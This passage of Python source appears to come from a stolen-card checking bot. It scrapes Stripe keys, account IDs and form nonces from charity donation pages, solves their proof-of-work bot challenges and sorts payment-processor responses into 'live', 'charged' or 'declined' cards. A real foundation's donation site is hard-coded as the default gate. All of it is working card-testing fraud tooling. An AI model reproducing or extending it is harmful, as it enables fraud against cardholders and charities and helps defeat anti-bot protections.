        r'"publishableKey":"(pk_live_[^"]+)"',
        r'"stripe_publishable_key":"(pk_live_[^"]+)"',
        r'"key":"(pk_live_[^"]+)"',
    ]
    for pat in pk_patterns:
        m = re.search(pat, html)
        if m:
            pk = m.group(1)
            break

    acct_patterns = [
        r'"accountId":"(acct_[^"]+)"',
        r'"stripe_account":"(acct_[^"]+)"',
        r'"stripeAccountId":"(acct_[^"]+)"',
    ]
    for pat in acct_patterns:
        m = re.search(pat, html)
        if m:
            acct = m.group(1)
            break

    nonce_patterns = [
        r'"createSetupIntentNonce":"([^"]+)"',
        r'"createAndConfirmSetupIntentNonce":"([^"]+)"',
        r'"create_setup_intent_nonce":"([a-z0-9]+)"',
        r'createSetupIntentNonce["\s:]+([a-f0-9]+)',
        r'"wcpaySetupIntentNonce":"([^"]+)"',
        r'setup_intent_nonce["\s:\']+([a-f0-9]+)',
    ]
    for pat in nonce_patterns:
        m = re.search(pat, html)
        if m:
            nonce = m.group(1)
            break

    return pk, acct, nonce


def _parse_token_error(err):
    if not err:
        return "error", "Tokenization Failed"

    msg = err.get("message", "") if isinstance(err, dict) else str(err)
    code = err.get("code", "") if isinstance(err, dict) else ""
    decline_code = err.get("decline_code", "") if isinstance(err, dict) else ""
    msg_lower = msg.lower()
    check = f"{code} {decline_code} {msg_lower}"

    logger.info(f"Token response: {code or decline_code or 'processed'}")

    if "insufficient" in check:
        return "live", "Insufficient Funds (Live)"
    elif "authentication_required" in check or "requires_action" in check:
        return "live", "3DS Required (Card Live)"
    elif "approve_with_id" in check:
        return "live", "Approved with ID (Live)"
    elif "card_velocity_exceeded" in check:
        return "live", "Activity Limit (Live)"
    elif "withdrawal_count_limit_exceeded" in check:
        return "live", "Limit Exceeded (Live)"
    elif "expired" in check:
        return "declined", "Expired Card"
    elif "incorrect_number" in check or ("incorrect" in check and "number" in check):
        return "declined", "Invalid Card Number"
    elif "invalid" in check and "number" in check:
        return "declined", "Invalid Card Number"
    elif "incorrect_cvc" in check or "security code" in check:
        return "live", "CVV Declined (Card Live)"
    elif "incorrect_zip" in check:
        return "live", "AVS Mismatch (Card Live)"
    elif "stolen_card" in check:
        return "declined", "Card Reported Stolen"
    elif "lost_card" in check:
        return "declined", "Card Reported Lost"
    elif "fraudulent" in check:
        return "declined", "Fraud Suspected"
    elif "do_not_honor" in check:
        return "declined", "Issuer/Cardholder Declined"
    elif "pickup_card" in check:
        return "declined", "Pick Up Card"
    elif "restricted_card" in check:
        return "declined", "Restricted Card"
    elif "live_mode_test_card" in check or "testmode" in check:
        return "declined", "Test Card Rejected"
    elif "processing_error" in check:
        return "declined", "Processor Declined"
    elif "card_declined" in check:
        dc = decline_code if decline_code and decline_code != "card_declined" else ""
        return "declined", f"Card Declined ({dc})" if dc else "Card Declined"
    elif "invalid_expiry" in check:
        return "declined", "Invalid Expiry"
    elif "incorrect_zip" in check:
        return "declined", "Declined - AVS"
    elif "security_violation" in check:
        return "declined", "Security Violation"
    elif "issuer_not_available" in check or "call_issuer" in check:
        return "declined", "Call Issuer"
    elif "transaction_not_allowed" in check or "not_permitted" in check:
        return "declined", "Transaction Not Allowed"
    elif "currency_not_supported" in check:
        return "declined", "Currency Not Supported"
    elif "invalid_amount" in check:
        return "declined", "Invalid Amount"
    elif "new_account_information_available" in check:
        return "declined", "Updated Card Available"
    elif "try_again_later" in check:
        return "declined", "Try Again Later"
    elif "service_not_allowed" in check:
        return "declined", "Transaction Not Allowed"
    elif "revocation_of_all_authorizations" in check:
        return "declined", "Revoked Authorization"
    elif "revocation_of_authorization" in check:
        return "declined", "Revoked Authorization"
    elif "not_sufficient_funds" in check:
        return "live", "Insufficient Funds (Live)"
    elif "pin" in check and ("incorrect" in check or "invalid" in check or "tries" in check):
        return "declined", "PIN Error"
    else:
        return "declined", msg[:80] if msg else "Card Declined"


def _parse_donation_result(res_text):
    if not res_text:
        return "error", "Empty response"

    res_lower = res_text.lower()

    if '"requires_action":true' in res_lower or '"requires_action": true' in res_lower:
        return "live", "3DS Required (Card Live)"

    if ('"success":true' in res_text or '"success": true' in res_text) and '"requires_action"' not in res_lower:
        return "charged", "Approved - Donation Processed"

    try:
        js = json.loads(res_text)
        if js.get("success") is True:
            if js.get("requires_action"):
                return "live", "3DS Required (Card Live)"
            return "charged", "Approved - Donation Processed"

        stripe_err = js.get("stripe_error", {}) or js.get("error", {})
        if isinstance(stripe_err, dict):
            s_code = stripe_err.get("code", "")
            s_decline = stripe_err.get("decline_code", "")
            s_msg = stripe_err.get("message", "")
            if s_code or s_decline:
                combined = f"{s_code} {s_decline} {s_msg}".lower()
                if "insufficient" in combined or "not_sufficient" in combined:
                    return "live", "Insufficient Funds (Live)"
                elif "authentication_required" in combined or "requires_action" in combined:
                    return "live", "3DS Required (Card Live)"
                elif "incorrect_cvc" in combined or "security code" in combined:
                    return "live", "CVV Declined (Card Live)"
                elif "incorrect_zip" in combined:
                    return "live", "AVS Mismatch (Card Live)"
                elif "card_velocity_exceeded" in combined or "withdrawal_count" in combined:
                    return "live", "Activity Limit (Live)"
                elif "approve_with_id" in combined:
                    return "live", "Approved with ID (Live)"
                elif "stolen_card" in combined:
                    return "declined", "Card Reported Stolen"
                elif "lost_card" in combined:
                    return "declined", "Card Reported Lost"
                elif "fraudulent" in combined:
                    return "declined", "Fraud Suspected"
                elif "do_not_honor" in combined:
                    return "declined", "Issuer/Cardholder Declined"
                elif "expired" in combined:
                    return "declined", "Expired Card"
                elif "incorrect_number" in combined or ("invalid" in combined and "number" in combined):
                    return "declined", "Invalid Card Number"

        if js.get("success") is False:
            err = js.get("errors", [])
            if isinstance(err, list) and len(err) > 1:
                specific = [e for e in err if isinstance(e, str) and ("decline" in e.lower() or "insufficient" in e.lower() or "expired" in e.lower() or "cvc" in e.lower() or "stolen" in e.lower() or "lost" in e.lower() or "fraud" in e.lower() or "3ds" in e.lower() or "honor" in e.lower() or "authentication" in e.lower())]
                res_text = specific[0] if specific else (err[-1] if isinstance(err[-1], str) else str(err[-1]))
            elif isinstance(err, list) and err:
                res_text = err[0] if isinstance(err[0], str) else str(err[0])
            elif isinstance(err, str):
                res_text = err
    except (json.JSONDecodeError, Exception):
        pass

    clean_msg = res_text
    if clean_msg.lower().startswith("error:"):
        clean_msg = clean_msg[6:].strip()

    clean_res = re.sub(r'<[^<]+?>', '', clean_msg).strip()

    check_text = clean_res.lower()

    RESPONSE_CODES = {
        "2001": ("live", "Insufficient Funds (Live)"),
        "2002": ("live", "Limit Exceeded (Live)"),
        "2003": ("live", "Activity Limit (Live)"),
        "2004": ("declined", "Expired Card"),
        "2005": ("declined", "Invalid Card Number"),
        "2006": ("declined", "Invalid Expiry"),
        "2010": ("declined", "CVV Mismatch"),
        "2014": ("declined", "Processor Declined"),
        "2015": ("declined", "Transaction Not Allowed"),
        "2038": ("declined", "Processor Declined"),
        "2046": ("declined", "Card Declined"),
        "2047": ("declined", "Call Issuer"),
        "2053": ("declined", "Card Reported Stolen"),
        "2054": ("declined", "Card Reported Lost"),
        "2057": ("declined", "Issuer/Cardholder Declined"),
        "2059": ("declined", "Fraud Suspected"),
        "2060": ("declined", "Security Violation"),
        "2061": ("declined", "Declined - AVS"),
        "81725": ("declined", "Invalid Card Number"),
        "81706": ("declined", "Invalid CVV"),
        "81707": ("declined", "CVV Required"),
        "81709": ("declined", "Invalid Expiry Month"),
        "81710": ("declined", "Invalid Expiry Year"),
        "81714": ("declined", "Card Already Expired"),
    }

    code_match = re.search(r'"code"\s*:\s*"?(\d{4,5})"?', res_text)
    if code_match:
        code_val = code_match.group(1)
        if code_val in RESPONSE_CODES:
            return RESPONSE_CODES[code_val]

    decline_map = {
        "insufficient_funds": ("live", "Insufficient Funds (Live)"),
        "insufficient funds": ("live", "Insufficient Funds (Live)"),
        "not_sufficient_funds": ("live", "Insufficient Funds (Live)"),
        "authentication_required": ("live", "3DS Required (Card Live)"),
        "requires_action": ("live", "3DS Required (Card Live)"),
        "incorrect_cvc": ("live", "CVV Declined (Card Live)"),
        "cvc_check_failed": ("live", "CVV Declined (Card Live)"),
        "incorrect_zip": ("live", "AVS Mismatch (Card Live)"),
        "stolen_card": ("declined", "Card Reported Stolen"),
        "lost_card": ("declined", "Card Reported Lost"),
        "fraudulent": ("declined", "Fraud Suspected"),
        "do_not_honor": ("declined", "Issuer/Cardholder Declined"),
        "do not honor": ("declined", "Issuer/Cardholder Declined"),
        "processing_error": ("declined", "Processor Declined"),
        "pickup_card": ("declined", "Pick Up Card"),
        "try_again_later": ("declined", "Try Again Later"),
        "not_permitted": ("declined", "Transaction Not Allowed"),
        "transaction_not_allowed": ("declined", "Transaction Not Allowed"),
        "generic_decline": ("declined", "Card Declined"),
        "card_declined": ("declined", "Card Declined"),
        "expired_card": ("declined", "Expired Card"),
        "card_velocity_exceeded": ("live", "Activity Limit (Live)"),
        "restricted_card": ("declined", "Restricted Card"),
        "security_violation": ("declined", "Security Violation"),
        "service_not_allowed": ("declined", "Transaction Not Allowed"),
        "testmode_decline": ("declined", "Test Mode Decline"),
        "currency_not_supported": ("declined", "Currency Not Supported"),
        "invalid_account": ("declined", "Invalid Card Number"),
        "new_account_information_available": ("declined", "Updated Card Available"),
        "withdrawal_count_limit_exceeded": ("live", "Limit Exceeded (Live)"),
        "approve_with_id": ("live", "Approved with ID (Live)"),
        "issuer_not_available": ("declined", "Call Issuer"),
        "reenter_transaction": ("declined", "Processor Declined"),
        "no_action_taken": ("declined", "Card Declined"),
        "incorrect_number": ("declined", "Invalid Card Number"),
        "your card number is incorrect": ("declined", "Invalid Card Number"),
        "card number is incorrect": ("declined", "Invalid Card Number"),
        "invalid_expiry": ("declined", "Invalid Expiry"),
        "incorrect_zip": ("declined", "Declined - AVS"),
    }

    for pattern, (status, detail) in decline_map.items():
        if pattern in check_text:
            return status, detail

    if "expired" in check_text:
        return "declined", "Expired Card"
    elif "rate_limit" in check_text:
        return "error", "Rate Limited"
    elif "approve" in check_text or "success" in check_text:
        return "charged", "Approved - Donation Processed"
    elif "declined" in check_text:
        return "declined", clean_res[:80] if clean_res else "Card Declined"
    elif "incorrect" in check_text or "invalid" in check_text:
        return "declined", clean_res[:80] if clean_res else "Card Declined"
    else:
        return "declined", clean_res[:80] if clean_res else "Card Declined"


def _error_result(cc, mes, ano, cvv, detail):
    return {
        "status": "error", "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "brand": "N/A", "detail": detail,
        "gate": "Stripe Charitable", "result": f"Error - {cc}|{mes}|{ano}|{cvv}"
    }


def detect_gate_type(full_url):
    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    result = {
        "gate_type": "stripe",
        "confidence": "low",
        "signals": [],
    }

    s = _make_session()
    try:
        try:
            r = s.get(full_url, verify=False, timeout=15, allow_redirects=True)
        except Exception:
            return result

        html = r.text.lower()

        stripe_signals = 0
        braintree_signals = 0

        if 'stripe' in html:
            stripe_signals += 1
            result["signals"].append("stripe keyword")
        if 'pk_live_' in html or 'pk_test_' in html:
            stripe_signals += 3
            result["signals"].append("stripe pub key")
        if 'charitable' in html:
            stripe_signals += 2
            result["signals"].append("charitable form")
        if '_charitable_donation_nonce' in html:
            stripe_signals += 3
            result["signals"].append("donation nonce")
        if 'donate' in html or 'donation' in html:
            stripe_signals += 1
            result["signals"].append("donation keywords")
        if 'stripe.js' in html or 'js.stripe.com' in html:
            stripe_signals += 2
            result["signals"].append("stripe.js")

        if 'braintree' in html:
            braintree_signals += 2
            result["signals"].append("braintree keyword")
        if 'braintree-api' in html or 'braintreegateway' in html:
            braintree_signals += 3
            result["signals"].append("braintree API")
        if 'clienttoken' in html or 'client_token' in html:
            braintree_signals += 2
            result["signals"].append("BT client token")
        if 'braintree.js' in html or 'braintree-web' in html:
            braintree_signals += 2
            result["signals"].append("braintree.js")

        if stripe_signals > braintree_signals:
            result["gate_type"] = "stripe"
            result["confidence"] = "high" if stripe_signals >= 3 else "medium"
        elif braintree_signals > stripe_signals:
            result["gate_type"] = "braintree"
            result["confidence"] = "high" if braintree_signals >= 3 else "medium"
        else:
            result["gate_type"] = "stripe"
            result["confidence"] = "low"

    except Exception:
        pass
    finally:
        s.close()

    return result


def setup_gate_from_url(full_url):
    from config import set_gate_setting as _set_gs, get_all_gate_settings

    results = {
        "success": False,
        "site_url": "",
        "donate_path": "",
        "stripe_key": "",
        "campaign_id": "",
        "stripe_account": "",
        "form_found": False,
        "pow_required": False,
        "pow_solved": False,
        "errors": [],
        "auto_detected": [],
    }

    old_settings = get_all_gate_settings("stripe")

    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    parsed = urlparse(full_url)
    site_url = f"{parsed.scheme}://{parsed.netloc}"
    donate_path = parsed.path if parsed.path and parsed.path != "/" else "/donate/"
    if not donate_path.endswith("/") and "." not in donate_path.split("/")[-1]:
        donate_path += "/"

    results["site_url"] = site_url
    results["donate_path"] = donate_path

    s = _make_session()
    new_settings = {}
    try:
        try:
            r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
            if r.status_code != 200:
                results["errors"].append(f"Site returned HTTP {r.status_code}")
                return results
        except Exception as e:
            results["errors"].append(f"Cannot reach site: {str(e)[:60]}")
            return results

        results["auto_detected"].append(f"Site URL: {site_url}")
        new_settings["site_url"] = site_url

        donate_url = f"{site_url}{donate_path}"
        try:
            r2 = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
            if r2.status_code == 404:
                common_paths = ["/donate/", "/donations/", "/give/", "/support/", "/contribute/", "/donation/"]
                found = False
                for path in common_paths:
                    if path == donate_path:
                        continue
                    try:
                        test_r = s.get(f"{site_url}{path}", verify=False, timeout=10, allow_redirects=True)
                        if test_r.status_code == 200 and ('charitable' in test_r.text.lower() or 'donation' in test_r.text.lower() or 'stripe' in test_r.text.lower()):
                            donate_path = path
                            results["donate_path"] = path
                            results["auto_detected"].append(f"Donate path: {path} (auto-found)")
                            r2 = test_r
                            found = True
                            break
                    except Exception:
                        continue
                if not found:
                    results["errors"].append(f"Donate page not found at {donate_path} or common paths")
                    return results
            elif r2.status_code != 200:
                results["errors"].append(f"Donate page HTTP {r2.status_code}")
                return results
            else:
                results["auto_detected"].append(f"Donate path: {donate_path}")
        except Exception as e:
            results["errors"].append(f"Cannot reach donate page: {str(e)[:60]}")
            return results

        new_settings["donate_path"] = donate_path

        page_html = r2.text

        if 'pow_nonce' in page_html or 'Verifying' in page_html or 'not a bot' in page_html:
            results["pow_required"] = True
            solved = _solve_pow(page_html, s, f"{site_url}{donate_path}")
            if solved:
                results["pow_solved"] = True
                page_html = solved
                results["auto_detected"].append("PoW challenge: solved")
            else:
                results["errors"].append("PoW challenge failed")

        soup = BeautifulSoup(page_html, 'html.parser')

        nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
        form_id_el = soup.find('input', {'name': 'charitable_form_id'})
        campaign_el = soup.find('input', {'name': 'campaign_id'})

        if nonce_el and form_id_el:
            results["form_found"] = True
            results["auto_detected"].append("Charitable form: detected")
        else:
            nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
            form_match = re.search(r'charitable_form_id["\s]+value=["\']([^"\']+)', page_html)
            if nonce_match and form_match:
                results["form_found"] = True
                results["auto_detected"].append("Charitable form: detected (regex)")
            else:
                results["errors"].append("Charitable donation form not found")

        pk = _extract_stripe_key(page_html)
        if pk:
            new_settings["pub_key"] = pk
            results["stripe_key"] = pk[:25] + "..."
            results["auto_detected"].append(f"Stripe key: {pk[:20]}...")
        else:
            results["errors"].append("No Stripe key found - set manually via /setgate key [key]")

        if campaign_el:
            cid = campaign_el.get('value', '')
            if cid:
                new_settings["campaign_id"] = cid
                results["campaign_id"] = cid
                results["auto_detected"].append(f"Campaign ID: {cid}")

        acct_match = re.search(r'"stripeAccountId":"(acct_[^"]+)"', page_html) or \
                     re.search(r'"accountId":"(acct_[^"]+)"', page_html) or \
                     re.search(r'"stripe_account":"(acct_[^"]+)"', page_html)
        if acct_match:
            acct_id = acct_match.group(1)
            new_settings["stripe_account"] = acct_id
            results["stripe_account"] = acct_id
            results["auto_detected"].append(f"Stripe account: {acct_id}")

        if results["form_found"] and pk:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("stripe", k, v)
        else:
            results["errors"].append("Setup incomplete - previous gate settings preserved")

    except Exception as e:
        results["errors"].append(f"Setup error: {str(e)[:80]}")
    finally:
        s.close()

    return results


def diagnose_gate():
    results = {
        "site_reachable": False,
        "donate_page_ok": False,
        "form_found": False,
        "stripe_key_found": False,
        "stripe_key": "",
        "campaign_id": "",
        "nonce_found": False,
        "pow_required": False,
        "pow_solved": False,
        "errors": [],
        "fixes_applied": [],
        "site_url": "",
        "donate_path": "",
    }

    site_url = get_gate_setting("stripe", "site_url", "https://pipelineforchangefoundation.com").rstrip("/")
    donate_path = get_gate_setting("stripe", "donate_path", "/donate/")
    results["site_url"] = site_url
    results["donate_path"] = donate_path
    donate_url = f"{site_url}{donate_path}"

    s = _make_session()
    try:
        try:
            r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
            if r.status_code == 200:
                results["site_reachable"] = True
            else:
                results["errors"].append(f"Site returned HTTP {r.status_code}")
        except Exception as e:
            results["errors"].append(f"Cannot reach site: {str(e)[:60]}")
            return results

        try:
            r2 = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
            if r2.status_code == 200:
                results["donate_page_ok"] = True
            elif r2.status_code == 404:
                results["errors"].append(f"Donate page not found (404) at {donate_path}")
                common_paths = ["/donate/", "/donations/", "/give/", "/support/", "/contribute/"]
                for path in common_paths:
                    if path == donate_path:
                        continue
                    try:
                        test_r = s.get(f"{site_url}{path}", verify=False, timeout=10, allow_redirects=True)
                        if test_r.status_code == 200 and ('charitable' in test_r.text.lower() or 'donation' in test_r.text.lower()):
                            from config import set_gate_setting as _set
                            _set("stripe", "donate_path", path)
                            results["fixes_applied"].append(f"Auto-fixed donate path: {donate_path} → {path}")
                            results["donate_page_ok"] = True
                            results["donate_path"] = path
                            r2 = test_r
                            break
                    except Exception:
                        continue
                if not results["donate_page_ok"]:
                    return results
            else:
                results["errors"].append(f"Donate page HTTP {r2.status_code}")
                return results
        except Exception as e:
            results["errors"].append(f"Cannot reach donate page: {str(e)[:60]}")
            return results

        page_html = r2.text

        if 'pow_nonce' in page_html or 'Verifying' in page_html or 'not a bot' in page_html:
            results["pow_required"] = True
            solved = _solve_pow(page_html, s, donate_url)
            if solved:
                results["pow_solved"] = True
                page_html = solved
            else:
                results["errors"].append("PoW challenge detected but failed to solve")

        soup = BeautifulSoup(page_html, 'html.parser')
        nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
        form_id_el = soup.find('input', {'name': 'charitable_form_id'})
        campaign_el = soup.find('input', {'name': 'campaign_id'})

        if nonce_el:
            results["nonce_found"] = True
        else:
            nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
            if nonce_match:
                results["nonce_found"] = True

        if nonce_el and form_id_el:
            results["form_found"] = True
        else:
            if not nonce_el and not form_id_el:
                results["errors"].append("Charitable donation form not found on page")
            elif not nonce_el:
                results["errors"].append("Donation nonce field missing")
            elif not form_id_el:
                results["errors"].append("Form ID field missing")

        if campaign_el:
            results["campaign_id"] = campaign_el.get('value', '')

        pk = _extract_stripe_key(page_html)
        admin_pk = get_gate_setting("stripe", "pub_key", "")
        final_key = pk or admin_pk or STRIPE_PUB_KEY

        if pk:
            results["stripe_key_found"] = True
            results["stripe_key"] = pk[:25] + "..."
            if not admin_pk and pk:
                from config import set_gate_setting as _set2
                _set2("stripe", "pub_key", pk)
                results["fixes_applied"].append(f"Auto-detected Stripe key: {pk[:20]}...")
        elif admin_pk:
            results["stripe_key_found"] = True
            results["stripe_key"] = admin_pk[:25] + "..."
        elif STRIPE_PUB_KEY:
            results["stripe_key_found"] = True
            results["stripe_key"] = STRIPE_PUB_KEY[:25] + "..."
        else:
            results["errors"].append("No Stripe publishable key found anywhere")

        if campaign_el and not get_gate_setting("stripe", "campaign_id", ""):
            cid = campaign_el.get('value', '')
            if cid:
                from config import set_gate_setting as _set3
                _set3("stripe", "campaign_id", cid)
                results["fixes_applied"].append(f"Auto-detected campaign ID: {cid}")

        acct_match = re.search(r'"stripeAccountId":"(acct_[^"]+)"', page_html) or \
                     re.search(r'"accountId":"(acct_[^"]+)"', page_html) or \
                     re.search(r'"stripe_account":"(acct_[^"]+)"', page_html)
        if acct_match and not get_gate_setting("stripe", "stripe_account", ""):
            acct_id = acct_match.group(1)
            from config import set_gate_setting as _set4
            _set4("stripe", "stripe_account", acct_id)
            results["fixes_applied"].append(f"Auto-detected Stripe account: {acct_id}")

    except Exception as e:
        results["errors"].append(f"Diagnostic error: {str(e)[:80]}")
    finally:
        s.close()

    return results
